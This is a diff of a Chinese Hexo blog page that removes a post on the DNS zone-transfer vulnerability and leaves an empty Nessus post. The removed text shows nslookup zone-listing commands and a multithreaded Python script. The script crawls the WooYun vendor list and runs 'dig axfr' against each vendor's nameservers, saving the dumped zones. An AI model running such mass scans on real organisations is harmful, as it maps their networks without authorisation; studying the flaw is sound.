@@ -26,7 +26,7 @@
 
 
 
-  <meta name="keywords" content="dns," />
+  <meta name="keywords" content="Hexo,next" />
 
 
 
@@ -35,37 +35,16 @@
   <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />
 
 
-<meta name="description" content="最近研究了一下DNS域传送漏洞,这里记录一下学习结果
-DNS域传送漏洞概述DNS服务提供了域名到IP的映射,服务端口通常为53.DNS服务器分为三类:主服务器,备份服务器,缓存服务器.其中备份服务器同步主服务器的过程为域传送.当DNS服务器配置不当时可能导致任何匿名用户都可以获得整个域的所有记录,整个网络结构就暴漏给了攻击者.危害也就不言而喻了.
-常见的DNS记录有以下几类
-
-
-
-类别
-说明">
+<meta name="description">
 <meta property="og:type" content="article">
-<meta property="og:title" content="DNS域传送漏洞学习记录">
-<meta property="og:url" content="http://yoursite.com/2015/10/12/DNS域传送漏洞学习记录/index.html">
+<meta property="og:title" content="NESSUS使用记录">
+<meta property="og:url" content="http://yoursite.com/2016/01/13/NESSUS使用记录/index.html">
 <meta property="og:site_name" content="FengGe">
-<meta property="og:description" content="最近研究了一下DNS域传送漏洞,这里记录一下学习结果
-DNS域传送漏洞概述DNS服务提供了域名到IP的映射,服务端口通常为53.DNS服务器分为三类:主服务器,备份服务器,缓存服务器.其中备份服务器同步主服务器的过程为域传送.当DNS服务器配置不当时可能导致任何匿名用户都可以获得整个域的所有记录,整个网络结构就暴漏给了攻击者.危害也就不言而喻了.
-常见的DNS记录有以下几类
-
-
-
-类别
-说明">
-<meta property="og:updated_time" content="2015-12-04T07:29:07.178Z">
+<meta property="og:description">
+<meta property="og:updated_time" content="2016-01-13T02:57:52.333Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="DNS域传送漏洞学习记录">
-<meta name="twitter:description" content="最近研究了一下DNS域传送漏洞,这里记录一下学习结果
-DNS域传送漏洞概述DNS服务提供了域名到IP的映射,服务端口通常为53.DNS服务器分为三类:主服务器,备份服务器,缓存服务器.其中备份服务器同步主服务器的过程为域传送.当DNS服务器配置不当时可能导致任何匿名用户都可以获得整个域的所有记录,整个网络结构就暴漏给了攻击者.危害也就不言而喻了.
-常见的DNS记录有以下几类
-
-
-
-类别
-说明">
+<meta name="twitter:title" content="NESSUS使用记录">
+<meta name="twitter:description">
 
 
 <script type="text/javascript" id="hexo.configuration">
@@ -75,7 +54,7 @@ DNS域传送漏洞概述DNS服务提供了域名到IP的映射,服务端口通�
   };
 </script>
 
-  <title> DNS域传送漏洞学习记录 | FengGe </title>
+  <title> NESSUS使用记录 | FengGe </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -214,7 +193,7 @@ DNS域传送漏洞概述DNS服务提供了域名到IP的映射,服务端口通�
           
           
             
-              DNS域传送漏洞学习记录
+              NESSUS使用记录
             
           
         </h1>
@@ -223,8 +202,8 @@ DNS域传送漏洞概述DNS服务提供了域名到IP的映射,服务端口通�
       <div class="post-meta">
         <span class="post-time">
           发表于
-          <time itemprop="dateCreated" datetime="2015-10-12T15:30:39+08:00" content="2015-10-12">
-            2015-10-12
+          <time itemprop="dateCreated" datetime="2016-01-13T10:57:52+08:00" content="2016-01-13">
+            2016-01-13
           </time>
         </span>
 
@@ -234,8 +213,8 @@ DNS域传送漏洞概述DNS服务提供了域名到IP的映射,服务端口通�
           
             <span class="post-comments-count">
               &nbsp; | &nbsp;
-              <a href="/2015/10/12/DNS域传送漏洞学习记录/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/10/12/DNS域传送漏洞学习记录/" itemprop="commentsCount"></span>
+              <a href="/2016/01/13/NESSUS使用记录/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2016/01/13/NESSUS使用记录/" itemprop="commentsCount"></span>
               </a>
             </span>
           
@@ -249,150 +228,22 @@ DNS域传送漏洞概述DNS服务提供了域名到IP的映射,服务端口通�
       
 
       
-        <span itemprop="articleBody"><p>最近研究了一下DNS域传送漏洞,这里记录一下学习结果</p>
-<h2 id="DNS域传送漏洞概述">DNS域传送漏洞概述</h2><p>DNS服务提供了域名到IP的映射,服务端口通常为53.DNS服务器分为三类:主服务器,备份服务器,缓存服务器.其中备份服务器同步主服务器的过程为<strong>域传送</strong>.<br>当DNS服务器配置不当时可能导致任何匿名用户都可以获得整个域的所有记录,整个网络结构就暴漏给了攻击者.危害也就不言而喻了.</p>
-<p>常见的DNS记录有以下几类</p>
-<table>
-<thead>
-<tr>
-<th>类别</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>A</td>
-<td>ip地址映射</td>
-</tr>
-<tr>
-<td>AAAA</td>
-<td>ipv6地址映射</td>
-</tr>
-<tr>
-<td>CHAME</td>
-<td>别名</td>
-</tr>
-<tr>
-<td>NS</td>
-<td>域名记录</td>
-</tr>
-<tr>
-<td>MX</td>
-<td>邮箱交换记录</td>
-</tr>
-<tr>
-<td>PTR</td>
-<td>反向记录</td>
-</tr>
-<tr>
-<td>TXT</td>
-<td>邮箱信息</td>
-</tr>
-</tbody>
-</table>
-<h2 id="nslookup命令检测域传送漏洞">nslookup命令检测域传送漏洞</h2><p>1.非交互式</p>
-<pre><code>cmd&gt; nslookup -type=ns baidu.com
-<span class="preprocessor">#查看baidu.com此域名被哪个dns服务器解析</span>
-cmd&gt; nslookup -type=ptr <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span>
-<span class="preprocessor">#反向查看<span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span>的域名</span>
-</code></pre><p>2.交互式</p>
-<pre><code><span class="built_ins">cmd</span>&gt; nslookup <span class="comment">#进入交互</span>
-<span class="built_ins">cmd</span>&gt; server dns.baidu.com <span class="comment">#指定dnsserver</span>
-<span class="built_ins">cmd</span>&gt; ls baidu.com <span class="comment">#列出所有记录</span>
-</code></pre><p>可以写一个bat脚本保存为 dnstest.bat</p>
-<pre><code>echo <span class="keyword">ls</span> <span class="variable">%1</span> | nslookup - <span class="variable">%2</span>
-</code></pre><p>在使用时格式如下:</p>
-<pre><code><span class="tag">dnstest</span> <span class="tag">baidu</span><span class="class">.com</span> <span class="tag">dns</span><span class="class">.baidu</span><span class="class">.com</span>
-<span class="id">#param1</span>中写入访问域名
-<span class="id">#param2</span>中写入<span class="tag">dns</span>地址
-</code></pre><h2 id="DNS批量扫描PY脚本">DNS批量扫描PY脚本</h2><p>想到写一个批量扫描乌云上所有厂商DNS域传送漏洞的脚本:<br>1.以厂商页为首页爬取所有厂商url<br>2.根据url得到dns服务地址<br>3.如果存在漏洞将结果存入文件保存</p>
-<p>改了改lijiejie的代码如下:</p>
-<pre><code><span class="comment">#coding = utf-8</span>
-<span class="keyword">import</span> urllib2,re,threading,os
-list1 = [<span class="string">'share.baidu.com'</span>,<span class="string">'hm.baidu.com'</span>,<span class="string">'sae.sina.com'</span>,<span class="string">'widget.weibo.com'</span>,<span class="string">'cip4.czpush.com'</span>]
-colleges = []
-<span class="keyword">for</span> item <span class="keyword">in</span> range(<span class="number">41</span>,<span class="number">43</span>):
-    <span class="keyword">if</span> item == <span class="number">1</span>:
-        html_doc = urllib2.urlopen(<span class="string">'http://wooyun.org/corps'</span>).read().decode(<span class="string">'utf-8'</span>)
-        links = re.findall(<span class="string">r'\w+.\w+\.com|\w+.\w+\.cn|\w+.\w+\.net'</span>, html_doc)
-    <span class="keyword">else</span>:
-        html_doc = urllib2.urlopen(<span class="string">'http://wooyun.org/corps/page/'</span>+str(item)).read().decode(<span class="string">'utf-8'</span>)
-        links = re.findall(<span class="string">r'\w+.\w+\.com|\w+.\w+\.cn|\w+.\w+\.net'</span>, html_doc)
-        <span class="keyword">print</span> <span class="string">'spidering %d'</span>% item
-    <span class="keyword">for</span> url <span class="keyword">in</span> links:
-        <span class="keyword">if</span> url <span class="keyword">not</span> <span class="keyword">in</span> list1 <span class="keyword">and</span> (<span class="string">'/'</span><span class="keyword">not</span> <span class="keyword">in</span> url):
-            <span class="keyword">try</span>:
-                colleges.index(url)
-                <span class="keyword">pass</span>
-            <span class="keyword">except</span> Exception, e:
-                colleges.append(url)        
-f = open(<span class="string">'1.txt'</span>,<span class="string">'w'</span>)
-<span class="keyword">for</span> item <span class="keyword">in</span> colleges:
-    f.write(item+<span class="string">'\n'</span>)
-<span class="string">'''colleges = []
-f = open('1.txt','r')
-for item in f:
-    colleges.append(item.replace('\n',''))'''</span>        
-lock = threading.Lock()
-c_index = <span class="number">0</span>
-<span class="function"><span class="keyword">def</span> <span class="title">test_DNS_Servers</span><span class="params">()</span>:</span>
-    <span class="keyword">global</span> c_index
-    <span class="keyword">while</span> <span class="keyword">True</span>:
-        lock.acquire()
-        <span class="keyword">if</span> c_index &gt;= len(colleges):
-            lock.release()
-            <span class="keyword">break</span>    <span class="comment"># End of list</span>
-        domain = colleges[c_index].lstrip(<span class="string">'www.'</span>)
-        c_index += <span class="number">1</span>
-        lock.release()
-        cmd_res = os.popen(<span class="string">'nslookup -type=ns '</span> + domain).read()    <span class="comment"># fetch DNS Server List</span>
-        <span class="keyword">print</span> domain
-        dns_servers = re.findall(<span class="string">'nameserver = ([\w\.]+)'</span>, cmd_res)
-        <span class="keyword">for</span> server <span class="keyword">in</span> dns_servers:
-            <span class="keyword">if</span> len(server) &lt; <span class="number">5</span>: server += domain
-            cmd_res = os.popen(os.getcwd() + <span class="string">'\\BIND9\\dig @%s axfr %s'</span> % (server, domain)).read()
-            <span class="keyword">if</span> cmd_res.find(<span class="string">'Transfer failed.'</span>) &lt; <span class="number">0</span> <span class="keyword">and</span> \
-               cmd_res.find(<span class="string">'connection timed out'</span>) &lt; <span class="number">0</span> <span class="keyword">and</span> \
-               cmd_res.find(<span class="string">'XFR size'</span>) &gt; <span class="number">0</span> :
-                lock.acquire()
-                <span class="keyword">print</span> <span class="string">'*'</span> * <span class="number">10</span> +  <span class="string">' Vulnerable dns server found:'</span>, server, <span class="string">'*'</span> * <span class="number">10</span>
-                lock.release()
-                <span class="keyword">with</span> open(<span class="string">'vulnerable_hosts.txt'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:
-                    f.write(<span class="string">'%s    %s\n'</span> % (server.ljust(<span class="number">30</span>), domain))
-                <span class="keyword">with</span> open(<span class="string">'dns\\'</span> + server + <span class="string">'.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f:
-                    f.write(cmd_res)           
-threads = []
-<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):
-    t = threading.Thread(target=test_DNS_Servers)
-    t.start()
-    threads.append(t)
-<span class="keyword">for</span> t <span class="keyword">in</span> threads:
-    t.join()
-</code></pre><p>扫出来了4个存在dns域传送的漏洞,lijiejie原版扫高校的脚本能扫出来近三分之一的高校都存在此漏洞<br><a href="https://github.com/lijiejie/edu-dns-zone-transfer" target="_blank" rel="external">原版脚本传送门</a><br>本文参考<br><a href="http://www.lijiejie.com/dns-zone-transfer-3/" target="_blank" rel="external">lijiejie Blog</a></p>
-</span>
+        <span itemprop="articleBody"></span>
       
     </div>
 
     <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/dns/" rel="tag">#dns</a>
-          
-        </div>
       
 
       
         <div class="post-nav">
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2015/11/09/apache性能优化记录/" rel="prev">apache性能优化记录</a>
-            
           </div>
 
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015/09/23/python操作数据库/" rel="next">python操作数据库</a>
+              <a href="/2016/01/05/谈谈序列化和反序列化的问题/" rel="next">谈谈序列化和反序列化引发的问题</a>
             
           </div>
         </div>
@@ -417,8 +268,8 @@ threads = []
         
           <div class="comments" id="comments">
             
-              <div class="ds-thread" data-thread-key="2015/10/12/DNS域传送漏洞学习记录/"
-                   data-title="DNS域传送漏洞学习记录" data-url="http://yoursite.com/2015/10/12/DNS域传送漏洞学习记录/">
+              <div class="ds-thread" data-thread-key="2016/01/13/NESSUS使用记录/"
+                   data-title="NESSUS使用记录" data-url="http://yoursite.com/2016/01/13/NESSUS使用记录/">
               </div>
             
           </div>
@@ -529,7 +380,7 @@ threads = []
           <div class="post-toc">
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS域传送漏洞概述"><span class="nav-number">1.</span> <span class="nav-text">DNS域传送漏洞概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nslookup命令检测域传送漏洞"><span class="nav-number">2.</span> <span class="nav-text">nslookup命令检测域传送漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS批量扫描PY脚本"><span class="nav-number">3.</span> <span class="nav-text">DNS批量扫描PY脚本</span></a></li></ol></div>
+              <p class="post-toc-empty">此文章未包含目录</p>
             
           </div>
           <div class="post-toc-indicator-bottom post-toc-indicator"></div>
